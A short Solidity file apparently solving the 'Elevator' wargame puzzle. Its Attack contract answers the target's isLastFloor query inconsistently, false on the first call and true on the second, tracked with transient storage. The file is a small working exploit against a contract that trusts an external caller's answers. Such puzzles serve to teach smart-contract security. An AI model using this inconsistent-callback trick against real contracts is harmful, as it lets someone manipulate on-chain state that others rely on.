//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Attack {
    function goTo(IElevator elevator) external {
        // any number will do
        elevator.goTo(block.number);
    }

    function isLastFloor(uint256) external returns (bool) {
        // use transient storage
        assembly {
            let isCalled := tload(0)
            if iszero(isCalled) { 
                tstore(0, 1)
                return(0, 32)
            }

            mstore(0, 1)
            return(0, 32)
        }
    }
}